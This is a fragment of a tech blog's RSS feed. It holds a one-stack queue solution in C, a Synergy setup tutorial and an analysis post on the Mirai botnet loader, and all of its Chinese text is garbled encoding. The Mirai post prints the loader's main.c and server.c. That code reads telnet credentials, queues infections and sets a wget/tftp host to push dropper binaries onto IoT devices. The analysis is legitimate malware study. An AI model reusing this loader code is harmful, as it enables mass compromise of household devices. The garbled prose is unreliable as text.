&lt;a href="https://blog.csdn.net/qq_22488067/article/details/73195621" target="_blank" rel="noopener">C++ ä¸¤ä¸ªç±»å¤´æä»¶äºç¸å¼ç¨&lt;/a>&lt;/li>
&lt;li>
&lt;a href="https://blog.csdn.net/xiqingnian/article/details/41214539" target="_blank" rel="noopener">C++ä¸­ä¸¤ä¸ªç±»äºç¸å¼ç¨çè§£å³æ¹æ³&lt;/a>&lt;/li>
&lt;/ul>
&lt;hr></description></item><item><title>é¢è¯é¢ï¼ä½¿ç¨ä¸ä¸ªstackå®ç°Queue</title><link>http://www.guozet.me/post/Interview-Implement-Queue-By-Stack/</link><pubDate>Tue, 20 Nov 2018 06:09:31 +0000</pubDate><guid>http://www.guozet.me/post/Interview-Implement-Queue-By-Stack/</guid><description>&lt;h1 id="question">Question&lt;/h1>
&lt;p>You are given a Stack data structure that supports standard push and pop operations.
You need to implement Queue data structure using one Stack instances.&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-11-21-Interview-Implement-Queue-By-Stack/2018-11-21-12-43-44.png" alt="">&lt;/p>
&lt;p>Picture From:
&lt;a href="http://javabypatel.blogspot.com/2016/11/implement-queue-using-one-stack-in-java.html" target="_blank" rel="noopener">Implement Queue using One Stack in Java (Recursive Implementation)&lt;/a>&lt;/p>
&lt;!-- more -->
&lt;hr>
&lt;h1 id="analyze">Analyze&lt;/h1>
&lt;p>å®ç°éåï¼æè¿æ ·ä¸¤ä¸ªå½æ°æä½ï¼&lt;/p>
&lt;p>enQueue() åæ æä½:&lt;/p>
&lt;ul>
&lt;li>Push the element to the Stack.&lt;/li>
&lt;/ul>
&lt;p>deQueue() åºæ æä½:&lt;/p>
&lt;ul>
&lt;li>Pop all the elements from Main Stack recursively until Stack item count is equal to 1.&lt;/li>
&lt;li>If Stack item count = 1, Pop item from Stack, Print it &amp;amp; Return.&lt;/li>
&lt;/ul>
&lt;p>Push all popped element back to Stack as shown below.
&lt;img src="http://www.guozet.me/images/in-post/2018-11-21-Interview-Implement-Queue-By-Stack/2018-11-21-13-02-51.png" alt="">&lt;/p>
&lt;hr>
&lt;h1 id="solution">Solution&lt;/h1>
&lt;pre>&lt;code class="language-cpp">// Implementing queue using a single stack
#include &amp;lt;stdio.h&amp;gt;
#define SIZE 10
int stack[10];
int top = -1;
int pop() {
if (top != -1) return stack[top--];
}
void push(int data) {
if (top &amp;lt; SIZE) stack[++top] = data;
}
void enqueue(int data) { push(data); }
// ä½¿ç¨éå½å®ç°åºæ æä½
int dequeue() {
if (top == 0) return pop();
int data = pop();
int value = dequeue();
push(data);
return value;
}
int main(void) {
int i;
// Enqueue
enqueue(1);
enqueue(2);
enqueue(3);
enqueue(4);
for (i = 0; i &amp;lt;= top; i++) printf(&amp;quot;%d &amp;quot;, stack[i]);
printf(&amp;quot;\n&amp;quot;);
// Dequeue
printf(&amp;quot;Dequeue --&amp;gt; %d\n&amp;quot;, dequeue());
printf(&amp;quot;Dequeue --&amp;gt; %d\n&amp;quot;, dequeue());
for (i = 0; i &amp;lt;= top; i++) printf(&amp;quot;%d &amp;quot;, stack[i]);
printf(&amp;quot;\n&amp;quot;);
return 0;
}
&lt;/code>&lt;/pre></description></item><item><title>Miraiæºä»£ç åæ1--Loaderçå·¥ä½è¿ç¨</title><link>http://www.guozet.me/post/Mirai-loader-Code-Walking-thought/</link><pubDate>Mon, 29 Oct 2018 06:09:31 +0000</pubDate><guid>http://www.guozet.me/post/Mirai-loader-Code-Walking-thought/</guid><description>&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-10-29-Mirai-loader-Code-Walking-thought/2018-10-30-12-42-01.png" alt="">&lt;/p>
&lt;h1 id="åè¨">åè¨&lt;/h1>
&lt;blockquote>
&lt;p>The Mirai internet of things (IoT) botnet is infamous for targeting connected household consumer products. It attaches itself to cameras, alarm systems and personal routers, and spreads quickly. The damage can be quite substantial. People might not realize that their internet-enabled webcam was actually responsible for attacking Netflix. Cite:
&lt;a href="https://www.incapsula.com/blog/how-to-identify-a-mirai-style-ddos-attack.html" target="_blank" rel="noopener">How to Identify a Mirai-Style DDoS Attack&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>Mirai IoT åµå°¸ç½ç»å¯ä»¥è¿æ¥å°å®¶å±çç¨æ·çº§çIoTè®¾å¤ï¼å®å¯ä»¥å°èªå·±å®è£å°æåå¤´ï¼è­¦æ¥å¨ä»¥åä¸ªäººçè·¯ç±å¨éé¢ï¼å¹¶ä¸è½å¤éå¸¸å¿«çæ©æ£åºå»ï¼é æå¾å¤§çç ´ååã&lt;/p>
&lt;!-- more -->
&lt;hr>
&lt;h1 id="ä¸»è¦å·¥ä½æµç¨">ä¸»è¦å·¥ä½æµç¨&lt;/h1>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-10-29-Mirai-loader-Code-Walking-thought/2018-10-30-10-09-07.png" alt="">&lt;/p>
&lt;ul>
&lt;li>Preparing the Attack&lt;/li>
&lt;li>Deploying the Malware&lt;/li>
&lt;li>Repeating the Attack&lt;/li>
&lt;/ul>
&lt;p>å¨è¿ä¸ç¯åå®¢éï¼ä¸»è¦å¯¹&lt;code>Deploying the Malware&lt;/code>çæµç¨çæºä»£ç è¿è¡è¯¦ç»çåæï¼å¸æè½å¤å¨æºä»£ç éè¯»ä¸­ï¼æ´å æ¸æ°å°äºè§£&lt;code>Mirai&lt;/code>çå¥ä¾µæµç¨ã&lt;/p>
&lt;hr>
&lt;h1 id="é¨ç½²malwareçæµç¨">é¨ç½²Malwareçæµç¨&lt;/h1>
&lt;p>å¨è¿é¨åä¸»è¦åæï¼Mirai Malware æ¯æä¹é¨ç½²å°IoTè®¾å¤ä¸é¢çï¼ä¹å°±æ¯æ´ä¸ªå¥ä¾µçè¿ç¨ï¼è¿ä¸ªè¿ç¨æ¯åºäºå¶ä»ç&lt;code>Bot&lt;/code>å·²ç»åç°äºç»å½å°è¿ä¸ªç³»ç»çå¸å·ä¹åãå¥ä¾µè¿ç¨åä¸ºä¸é¢ä¸ä¸ªé¨åï¼&lt;/p>
&lt;ul>
&lt;li>Scan success identified&lt;/li>
&lt;li>Loader receives data&lt;/li>
&lt;li>Loader pushes malware&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-10-29-Mirai-loader-Code-Walking-thought/2018-10-30-10-43-52.png" alt="">&lt;/p>
&lt;p>Malware çæºä»£ç å¨ &lt;code>Master&lt;/code>ç«¯éè¿äº¤åç¼è¯çæ¹å¼ä½¿å¶è½å¤æ¯æä¸ç³»åçä½ç³»æ¶æï¼å¨Materç«¯ç&lt;code>Loader&lt;/code>ä»£ç è¯å¾ç¡®å®å³å°ææç&lt;code>Bot&lt;/code>çç¡¬ä»¶ä½ç³»æ¶æï¼ç¶åå&lt;code>Push&lt;/code>æåéçå¯æ§è¡ç¨åºè¿å»ãç¶åï¼å¨å¯æ§è¡æä»¶è¿è¡çæåµä¸ï¼è¯¥è®¾å¤ç°å¨æ¯åµå°¸ç½ç»çæåï¼å¹¶å¼å§æ§è¡ä¸åµå°¸ç½ç»ä¸­ä»»ä½å¶ä»èç¹ç¸åçæ«æåæ»å»æ´»å¨ã&lt;/p>
&lt;p>&lt;strong>æä»¶ç®å½ä»ç»&lt;/strong>ï¼&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-10-29-Mirai-loader-Code-Walking-thought/2018-10-30-10-51-24.png" alt="">&lt;/p>
&lt;p>å·¦ä¸æ¹æ¾ç¤ºçç®å½æ¯&lt;code>Loader&lt;/code>æ ¹ç®å½ï¼éé¢åå«äºä¸¤ä¸ªæä»¶å¤¹ï¼&lt;code>bin&lt;/code>å&lt;code>src&lt;/code>ï¼ä¸¤ä¸ªæä»¶å¤¹åå«åå«äºï¼&lt;/p>
&lt;ul>
&lt;li>&lt;code>bin&lt;/code>æä»¶å¤¹ï¼ åå«äº&lt;code>dlr.armï¼ dlr.arm7ï¼ dlr.m68kï¼ dlr.mipsï¼ dlr.mpsl, dlr.ppc,dlr.sh4, dlr.spc, dlr.x86&lt;/code>ä¸åä½ç³»æ¶æä¸é¢çå¯æ§è¡ä»£ç .&lt;/li>
&lt;li>&lt;code>src&lt;/code>æä»¶å¤¹ï¼
&lt;ul>
&lt;li>main.c Loaderæ§è¡è¿ç¨çæ ¸å¿ç¨åº&lt;/li>
&lt;li>connection.c&lt;/li>
&lt;li>server.c&lt;/li>
&lt;li>telnet_info.c&lt;/li>
&lt;li>util.c å·¥å·æä»¶, æä¾ç»å¶ä»é¨åå¯ä»¥è°ç¨çåä¸ªå½æ°å·¥å·&lt;/li>
&lt;li>server.c&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="æºä»£ç åæ">æºä»£ç åæ&lt;/h2>
&lt;p>é¦åå¯¹&lt;code>main&lt;/code>å½æ°è¿è¡åæï¼å ä¸ºæ´ä¸ªæä»¶ä¸ç®å¤ªé¿ï¼æä»¥å°±å°å¶æºä»£ç å¨é¨æ¾å¨è¿éè¿è¡åæã&lt;/p>
&lt;pre>&lt;code class="language-cpp">#include &amp;lt;errno.h&amp;gt;
#include &amp;lt;pthread.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;sys/socket.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;quot;headers/binary.h&amp;quot;
#include &amp;quot;headers/includes.h&amp;quot;
#include &amp;quot;headers/server.h&amp;quot;
#include &amp;quot;headers/telnet_info.h&amp;quot;
#include &amp;quot;headers/util.h&amp;quot;
static void *stats_thread(void *);
static struct server *srv; //éè¦å¨å±åé
char *id_tag = &amp;quot;telnet&amp;quot;;
int main(int argc, char **args) {
pthread_t stats_thrd;
uint8_t addrs_len;
ipv4_t *addrs;
uint32_t total = 0;
struct telnet_info info;
addrs_len = 2;
addrs = calloc(addrs_len, sizeof(ipv4_t));
addrs[0] = inet_addr(&amp;quot;192.168.0.1&amp;quot;); // Address to bind to
addrs[1] = inet_addr(&amp;quot;192.168.1.1&amp;quot;); // Address to bind to
if (argc == 2) {
id_tag = args[1];
}
if (!binary_init()) {
printf(&amp;quot;Failed to load bins/dlr.* as dropper\n&amp;quot;);
return 1;
}
if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs,
1024 * 64, &amp;quot;100.200.100.100&amp;quot;, 80,
&amp;quot;100.200.100.100&amp;quot;)) == NULL) {
printf(&amp;quot;Failed to initialize server. Aborting\n&amp;quot;);
return 1;
}
pthread_create(&amp;amp;stats_thrd, NULL, stats_thread, NULL);
while (TRUE) {
char strbuf[1024];
if (fgets(strbuf, sizeof(strbuf), stdin) == NULL) break;
util_trim(strbuf);
if (strlen(strbuf) == 0) {
usleep(10000);
continue;
}
memset(&amp;amp;info, 0, sizeof(struct telnet_info));
if (telnet_info_parse(strbuf, &amp;amp;info) == NULL)
printf(
&amp;quot;Failed to parse telnet info: \&amp;quot;%s\&amp;quot; Format -&amp;gt; ip:port user:pass &amp;quot;
&amp;quot;arch\n&amp;quot;,
strbuf);
else {
if (srv == NULL) printf(&amp;quot;srv == NULL 2\n&amp;quot;);
server_queue_telnet(srv, &amp;amp;info);
if (total++ % 1000 == 0) sleep(1);
}
ATOMIC_INC(&amp;amp;srv-&amp;gt;total_input);
}
printf(&amp;quot;Hit end of input.\n&amp;quot;);
while (ATOMIC_GET(&amp;amp;srv-&amp;gt;curr_open) &amp;gt; 0) sleep(1);
return 0;
}
static void *stats_thread(void *arg) {
uint32_t seconds = 0;
while (TRUE) {
fflush(stdout);
sleep(1);
}
}
&lt;/code>&lt;/pre>
&lt;p>Main.cæä»¶ä¸­æè¿æ ·å ä¸ªéè¦çç»æä½ï¼&lt;/p>
&lt;ul>
&lt;li>static struct server *srv; å¨å±åé&lt;/li>
&lt;li>struct telnet_info info; å±é¨åé&lt;/li>
&lt;/ul>
&lt;p>å ä¸ªéè¦çå½æ°&lt;/p>
&lt;ul>
&lt;li>binary_init() å½æ°&lt;/li>
&lt;li>srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs, 1024 * 64, &amp;ldquo;100.200.100.100&amp;rdquo;, 80,&amp;ldquo;100.200.100.100&amp;rdquo;)) == NULL) éé¢ç&lt;code>server_create&lt;/code>å½æ°ã&lt;/li>
&lt;li>æåå¾ªç¯éé¢çï¼telnet_info_parse(strbuf, &amp;amp;info) ä¸ server_queue_telnet(srv, &amp;amp;info)å½æ°&lt;/li>
&lt;/ul>
&lt;h3 id="server_create-å½æ°è°ç¨serverc">server_create å½æ°è°ç¨ï¼Server.cï¼&lt;/h3>
&lt;p>å¨&lt;code>main.c&lt;/code>éé¢çmainå½æ°ä¸­è°ç¨äº&lt;code>server_create&lt;/code>å½æ°æ¥åå»ºäºæå¡å¨ç¨æ¥æ¯æ&lt;code>sftp&lt;/code>å&lt;code>wget&lt;/code>åè®®ã&lt;/p>
&lt;p>&lt;strong>main.c&lt;/strong>&lt;/p>
&lt;pre>&lt;code class="language-cpp">if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs,
1024 * 64, &amp;quot;100.200.100.100&amp;quot;, 80,
&amp;quot;100.200.100.100&amp;quot;)) == NULL) {
printf(&amp;quot;Failed to initialize server. Aborting\n&amp;quot;);
return 1;
}
&lt;/code>&lt;/pre>
&lt;p>server.c&lt;/p>
&lt;pre>&lt;code class="language-cpp">struct server *server_create(uint8_t threads, uint8_t addr_len, ipv4_t *addrs,
uint32_t max_open, char *wghip, port_t wghp,
char *thip) {
struct server *srv = calloc(1, sizeof(struct server));
struct server_worker *workers = calloc(threads, sizeof(struct server_worker));
int i;
srv-&amp;gt;bind_addrs_len = addr_len; // Default = 2
srv-&amp;gt;bind_addrs = addrs;
srv-&amp;gt;max_open = max_open; // 1024 * 64
srv-&amp;gt;wget_host_ip = wghip; // 100.200.100.100
srv-&amp;gt;wget_host_port = wghp; // 80
srv-&amp;gt;tftp_host_ip = thip; // 100.200.100.100
srv-&amp;gt;estab_conns = calloc(max_open * 2, sizeof(struct connection *));
srv-&amp;gt;workers = calloc(threads, sizeof(struct server_worker));
srv-&amp;gt;workers_len = threads;
if (srv-&amp;gt;estab_conns == NULL) {
printf(&amp;quot;Failed to allocate establisted_connections array.\n&amp;quot;);
exit(0);
}
for (i = 0; i &amp;lt; max_open * 2; i++) {
srv-&amp;gt;estab_conns[i] = calloc(1, sizeof(struct connection));
if (srv-&amp;gt;estab_conns[i] == NULL) {
printf(&amp;quot;Failed to allocate connection %d\n&amp;quot;, i);
exit(-1);
}
pthread_mutex_init(&amp;amp;(srv-&amp;gt;estab_conns[i]-&amp;gt;lock), NULL);
}
// Create worker threads
for (i = 0; i &amp;lt; threads; i++) //æå¤å°ä¸ªå¤çå¨
{
struct server_worker *wrker =
&amp;amp;srv-&amp;gt;workers[i]; //å®ä¹çæéåªæ³src-&amp;gt;workerçå°å
wrker-&amp;gt;srv = srv; //ç¸äºæå®
wrker-&amp;gt;thread_id = i;
if ((wrker-&amp;gt;efd = epoll_create1(0)) == -1) {
printf(&amp;quot;Failed to initialize epoll context. Error code %d\n&amp;quot;, errno);
free(srv-&amp;gt;workers);
free(srv);
return NULL;
}
pthread_create(&amp;amp;wrker-&amp;gt;thread, NULL, worker, wrker);
}
pthread_create(&amp;amp;srv-&amp;gt;to_thrd, NULL, timeout_thread, srv);
return srv;
}
&lt;/code>&lt;/pre>
&lt;p>è¿ä¸ªå½æ°å®æäºæå¡å¨çéç½®ï¼ç¡®å®äºæå¡å¨æ¹ç&lt;code>tftp&lt;/code>å&lt;code>wget&lt;/code>çæå¡æä¾æ¹å¼ï¼ä»¥å&lt;code>Port&lt;/code>çç¼å·ã&lt;/p>
&lt;hr>
&lt;h2 id="ä»£ç ä¸­çå ä¸ªå½æ°è¯´æ">ä»£ç ä¸­çå ä¸ªå½æ°è¯´æ&lt;/h2>
&lt;h4 id="sysconfå½æ°">sysconfå½æ°&lt;/h4>
&lt;p>
&lt;a href="http://man7.org/linux/man-pages/man3/sysconf.3.html" target="_blank" rel="noopener">sysconfå½æ°&lt;/a>ï¼ Get configuration information at run time&lt;/p>
&lt;pre>&lt;code class="language-cpp">#include &amp;lt;unistd.h&amp;gt;
long sysconf(int name);
&lt;/code>&lt;/pre>
&lt;h4 id="pthread_mutex_initå½æ°">pthread_mutex_initå½æ°&lt;/h4>
&lt;p>pthread_mutex_init(&amp;amp;(srv-&amp;gt;estab_conns[i]-&amp;gt;lock), NULL);&lt;/p>
&lt;blockquote>
&lt;ul>
&lt;li>pthread_mutex_init(pthread_mutex_t * mutex,const pthread_mutexattr_t *attr); åå§åéåémutexãatträ¸ºéå±æ§ï¼NULLå¼ä¸ºé»è®¤å±æ§ã&lt;/li>
&lt;li>pthread_mutex_lock(pthread_mutex_t *mutex);å é&lt;/li>
&lt;li>pthread_mutex_tylock(pthread_mutex_t *mutex);å éï¼ä½æ¯ä¸2ä¸ä¸æ ·çæ¯å½éå·²ç»å¨ä½¿ç¨çæ¶åï¼è¿åä¸ºEBUSYï¼èä¸æ¯æèµ·ç­å¾ã&lt;/li>
&lt;li>pthread_mutex_unlock(pthread_mutex_t *mutex);éæ¾é&lt;/li>
&lt;li>pthread_mutex_destroy(pthread_mutex_t *mutex);ä½¿ç¨å®åéæ¾&lt;/li>
&lt;/ul>
&lt;/blockquote>
&lt;h4 id="epollå½æ°">epollå½æ°&lt;/h4>
&lt;p>epoll ä¸ FreeBSDçkqueueç±»ä¼¼ï¼é½åç¨æ·ç©ºé´æä¾äºèªå·±çæä»¶æè¿°ç¬¦æ¥è¿è¡æä½ã&lt;/p>
&lt;p>&lt;code>int epoll_create(int size);&lt;/code>&lt;/p>
&lt;p>å»ºä¸ä¸ªepollçå¥æï¼sizeç¨æ¥åè¯åæ ¸éè¦çå¬çæ°ç®ä¸å±æå¤å¤§ãå½åå»ºå¥½epollå¥æåï¼å®å°±æ¯ä¼å ç¨ä¸ä¸ªfdå¼ï¼å¨linuxä¸å¦ææ¥ç/proc/è¿ç¨id/fd/ï¼æ¯è½å¤çå°è¿ä¸ªfdçï¼æä»¥å¨ä½¿ç¨å®epollåï¼å¿é¡»è°ç¨close() å³é­ï¼å¦åå¯è½å¯¼è´fdè¢«èå°½ã&lt;/p>
&lt;p>&lt;code>int epoll_create1(int flag);&lt;/code>&lt;/p>
&lt;p>å®åepoll_createå·®ä¸å¤ï¼ä¸åçæ¯epoll_create1å½æ°çåæ°æ¯flagï¼å½flagæ¯0æ¶ï¼è¡¨ç¤ºåepoll_createå½æ°å®å¨ä¸æ ·ï¼ä¸éè¦sizeçæç¤ºäºã&lt;/p>
&lt;p>å½flag = EPOLL_CLOEXECï¼åå»ºçepfdä¼è®¾ç½®FD_CLOEXECã&lt;/p>
&lt;p>å½flag = EPOLL_NONBLOCKï¼åå»ºçepfdä¼è®¾ç½®ä¸ºéé»å¡&lt;/p>
&lt;p>ä¸è¬ç¨æ³é½æ¯ä½¿ç¨EPOLL_CLOEXEC.&lt;/p>
&lt;p>å®æ¯fdçä¸ä¸ªæ è¯è¯´æï¼ç¨æ¥è®¾ç½®æä»¶close-on-execç¶æçãå½close-on-execç¶æä¸º0æ¶ï¼è°ç¨execæ¶ï¼fdä¸ä¼è¢«å³é­ï¼ç¶æéé¶æ¶åä¼è¢«å³é­ï¼è¿æ ·åå¯ä»¥é²æ­¢fdæ³é²ç»æ§è¡execåçè¿ç¨ãå³äºexecçç¨æ³ï¼å¤§å®¶å¯ä»¥å»èªå·±æ¥éä¸ï¼æèç´æ¥man execã&lt;/p>
&lt;h4 id="pthread_createå½æ°">pthread_createå½æ°&lt;/h4>
&lt;pre>&lt;code class="language-cpp">#include &amp;lt;pthread.h&amp;gt;
int pthread_create(pthread_t *thread, const pthread_attr_t *attr,
void *(*start_routine) (void *), void *arg);
Compile and link with -pthread.
&lt;/code>&lt;/pre>
&lt;p>The pthread_create() function starts a new thread in the calling
process. The new thread starts execution by invoking
start_routine(); arg is passed as the sole argument of
start_routine().
ãè¥æååè¿å0ï¼å¦åè¿ååºéç¼å·&lt;/p>
&lt;p>åæ°&lt;/p>
&lt;p>ããç¬¬ä¸ä¸ªåæ°ä¸ºæåçº¿ç¨æ è¯ç¬¦çæéã&lt;/p>
&lt;p>ããç¬¬äºä¸ªåæ°ç¨æ¥è®¾ç½®çº¿ç¨å±æ§ã&lt;/p>
&lt;p>ããç¬¬ä¸ä¸ªåæ°æ¯çº¿ç¨è¿è¡å½æ°çèµ·å§å°åã&lt;/p>
&lt;p>æåä¸ä¸ªåæ°æ¯è¿è¡å½æ°çåæ°ã&lt;/p>
&lt;h4 id="å»æå­ç¬¦ä¸²ååçç©ºæ ¼">å»æå­ç¬¦ä¸²ååçç©ºæ ¼&lt;/h4>
&lt;pre>&lt;code class="language-cpp">// ç¨æ¥å¤çååç©ºæ ¼çé®é¢
char *util_trim(char *str)
{
char *end;
while(isspace(*str)) //å¤çåé¢çç©ºæ ¼
str++;
if(*str == 0) //æåäº 0 , å°±æ¯è¾å¥çå°ä¸ä¸ªå­ç¬¦æ¯ 0 çè¯ï¼é£ä¹å°±ç´æ¥è¿åå»è¿ä¸ª str
return str;
//strlen()ç¨æ¥è®¡ç®æå®çå­ç¬¦ä¸²s çé¿åº¦ï¼ä¸åæ¬ç»æå­ç¬¦&amp;quot;\0&amp;quot;ã
end = str + strlen(str) - 1; //å¤æ­ç»æä½ç½®---ç§»å¨å°æåä¸ä¸ª /0 ä¹å
while(end &amp;gt; str &amp;amp;&amp;amp; isspace(*end)) //å¦æendä½ç½®å¤§çº¦strçæ¦æ±ä½ é«åº¦ï¼å¹¶ä¸endä½ç½®ä¸ºç©ºçè¯ï¼é£å°±ç§»å¨åæ¥
end--;
*(end+1) = 0; //ç»åºç»æä½ç½®
return str;
}
char strbuf[1024];
util_trim(strbuf);
&lt;/code>&lt;/pre>
&lt;h1 id="memsetå½æ°">memsetå½æ°&lt;/h1>
&lt;p>&lt;code>å½æ°ååæ¯ï¼void *memset(void *s, int ch, size_t n);&lt;/code>&lt;/p>
&lt;p>å½æ°åè½æ¯ï¼å°sææåçæä¸ååå­ä¸­çånä¸ªå­èçåå®¹å¨é¨è®¾ç½®ä¸ºchæå®çASCIIå¼ï¼ ç¬¬ä¸ä¸ªå¼ä¸ºæå®çåå­å°åï¼åçå¤§å°ç±ç¬¬ä¸ä¸ªåæ°æå®ï¼è¿ä¸ªå½æ°éå¸¸ä¸ºæ°ç³è¯·çåå­ååå§åå·¥ä½ï¼ å¶è¿åå¼ä¸ºæåsçæéï¼å®æ¯å¯¹è¾å¤§çç»æä½ææ°ç»è¿è¡æ¸é¶æä½çä¸ç§æå¿«æ¹æ³ã&lt;/p>
&lt;p>memsetå½æ°éå¸¸ç¨æ¥å¯¹ä¸åå·²ç»åéå°åçåå­è¿è¡åå§åï¼å¹¶ä¸éå¸¸åå§åä¸º0æèå­ç¬¦&amp;rsquo;\0&amp;rsquo;ï¼å®éä¸æ¯ä¸æ ·çï¼ã&lt;/p>
&lt;h1 id="strtok-å½æ°">strtok å½æ°&lt;/h1>
&lt;p>å½æ°ååï¼char *strtok(char *s, char *delim);
å½æ°åè½ï¼æå­ç¬¦ä¸²sæç§å­ç¬¦ä¸²delimè¿è¡åå²ï¼ç¶åè¿ååå²çç»æã&lt;/p>
&lt;p>1.strtokå½æ°çå®è´¨ä¸çå¤çæ¯ï¼strtokå¨sä¸­æ¥æ¾åå«å¨delimä¸­çå­ç¬¦å¹¶ç¨NULL(â\0â²)æ¥æ¿æ¢,ç´å°æ¾éæ´ä¸ªå­ç¬¦ä¸²ãè¿å¥è¯æä¸¤å±å«ä¹ï¼ï¼1ï¼æ¯æ¬¡è°ç¨strtokå½æ°åªè½è·å¾ä¸ä¸ªåå²åä½ãï¼2ï¼è¦è·å¾ææçåå²ååå¿é¡»åå¤è°ç¨strtokå½æ°ã&lt;/p>
&lt;p>2.strtokå½æ°ä»¥åçè°ç¨æ¶çéç¨NULLæ¥æ¿æ¢s.&lt;/p>
&lt;p>3.å½¢ås(è¦åå²çå­ç¬¦ä¸²)å¯¹åºçåéåºç¨char s[]=ââ¦.âå½¢å¼ï¼èä¸è½ç¨char *s=ââ¦.âå½¢å¼&lt;/p></description></item><item><title>synergyå±åç½å±äº«é¼ æ é®çè½¯ä»¶æç¨</title><link>http://www.guozet.me/post/Application-Synergy/</link><pubDate>Sat, 27 Oct 2018 10:14:31 +0000</pubDate><guid>http://www.guozet.me/post/Application-Synergy/</guid><description>&lt;h1 id="introduce">Introduce&lt;/h1>
&lt;p>&lt;code>synergy&lt;/code>å¯ä»¥å®ç° mac / linux / windowsä¸ä¸ªæä½ç³»ç»ä¹é´å±äº«é¼ æ é®çï¼å¿é¡»å¨æææºå¨ä¸é½å®è£è¿ä¸ªè½¯ä»¶ï¼å¹¶è¿è¡ç¸åºçéç½®ï¼æä¸å°å¯ä¸çä¸»æºä½ä¸ºæå¡å¨ç«¯ï¼å¶ä»ä¸»æºä½ä¸ºå®¢æ·ç«¯ï¼è¦å±äº«çé£å¥é¼ æ é®çé¾æ¥å°ç«¯ãææä¸»æºé½å¿é¡»è¿å¥åä¸ä¸ªå±åç½ï¼ä¼éè¿å±åç½äº¤æ¢é¼ æ é®ççè¾å¥ä¿¡æ¯ï¼ä»¥å®ç°å¶ä»ä¸»æºå±äº«ä½¿ç¨è¿å¥é¼ æ é®çã&lt;/p>
&lt;h1 id="download-and-install">Download and install&lt;/h1>
&lt;p>å ä¸ºå¨Ubuntu16.04ä¸é¢æ¯è¾å¥½å®è£ççæ¬æ¯&lt;code>1.6.2&lt;/code>ï¼æä»¥æä¸ºäºè½å¤å¨å±äº«çè¿ç¨ä¸­æ¯è¾é¡ºå©ï¼ä¹éç¨çè¿ä¸ªçæ¬æ¥å®æçï¼å¨Windowç«¯ä¸è½½&lt;code>1.6.2&lt;/code>å°±å¥½äºã&lt;/p>
&lt;ul>
&lt;li>Linux: ä½¿ç¨å½ä»¤è¡å®è£&lt;/li>
&lt;li>Win10(64ä½):
&lt;a href="http://www.guozet.me/download/application/synergy-1.6.2-Windows-x64.msi">ä¸è½½å°å&lt;/a>&lt;/li>
&lt;/ul>
&lt;!-- more -->
&lt;p>&lt;strong>Linux(Ubuntu16.04)&lt;/strong>&lt;/p>
&lt;pre>&lt;code class="language-bash">sudo apt-get install synergy
&lt;/code>&lt;/pre>
&lt;p>å®è£å®æä¹åå¨ç»ç«¯ä½¿ç¨synergyå½ä»¤å°±å¯ä»¥æå¼è½¯ä»¶äºã&lt;/p>
&lt;pre>&lt;code class="language-bash">synergy
&lt;/code>&lt;/pre>
&lt;p>&lt;strong>Window10ç«¯&lt;/strong>&lt;/p>
&lt;p>å¨Windowç«¯ä¾æ§éç¨å®è£çæ¯&lt;code>1.6.2&lt;/code>çæ¬ï¼ä¸ºä¿è¯çæ¬ä¸è´ãä¸è½½ä¸æ¥ä¹åï¼å¯å¨å®è£å³å¯ï¼&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-10-27-Application-Synergy/2018-10-27-00-13-13.png" alt="">&lt;/p>
&lt;p>åå«å¨LinuxåWindowç«¯å®è£å®æä¹åè¿è¡è½¯ä»¶æ£æµçæ¬æ¯å¦å¯¹åºï¼æå¼è½¯ä»¶ï¼å¨èåæ &lt;code>help&lt;/code>çä½ç½®å¯ä»¥çå°çæ¬ä¿¡æ¯ã&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-10-27-Application-Synergy/2018-10-27-00-14-49.png" alt="">&lt;/p>
&lt;h1 id="configure">Configure&lt;/h1>
&lt;p>éç½®è¿ç¨æ¯è¾æ¹ä¾¿ï¼åå«å¨&lt;code>Windows&lt;/code>å&lt;code>Linux&lt;/code>ç«¯è¿è¡è½¯ä»¶ï¼&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-10-27-Application-Synergy/2018-10-27-00-16-38.png" alt="">&lt;/p>
&lt;p>å°ä½ è¦ä½¿ç¨çé£å°çµèçé¼ æ é®çå±äº«ç»å¶ä»çµèä½¿ç¨çè¯ï¼é£å°±å°è¿å°çµèä¸é¢ç&lt;code>Synergy&lt;/code>è®¾ç½®ææå¡ç«¯ï¼å¶ä½çå¨é¨è®¾ç½®æå®¢æ·ç«¯å°±å¥½äºã&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-10-27-Application-Synergy/2018-10-27-00-18-28.png" alt="">&lt;/p>
&lt;p>è¿ééè¦ç¹å«æ³¨æï¼å¾çä¸­ç&lt;code>192.168.1.161&lt;/code>å¹¶ä¸æ¯çæ­£çä½ çIPå°åï¼ä½ éè¦æå¼ç½ç»ééå¨æ¾å°ä½ çæ­£çIPå°åï¼è¿æ ·å¶ä»çå®¢æ·ç«¯æè½å¤è¿æ¥è¿æ¥ãç¶ååéç½®æå¡å¨éé¢éè¦è¿æ¥è¿æ¥çå®¢æ·ç«¯çåç§°&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-10-27-Application-Synergy/2018-10-27-00-21-49.png" alt="">&lt;/p>
&lt;p>æ¯å¦ï¼å¨è¿éï¼ææ·»å äºä¸ä¸ªå«åChromebookçå®¢æ·ç«¯ï¼è¿éçåç§°æ¯æ ¹æ®ä½ å®¢æ·ç«¯æå¼ä¹åæ¾ç¤ºçåå­å³å®çãå¨è¿éä¹éç½®äºè¿æ¥è¿æ¥ä¹åï¼å±å¹æ¾ç¤ºçä½ç½®ã&lt;/p>
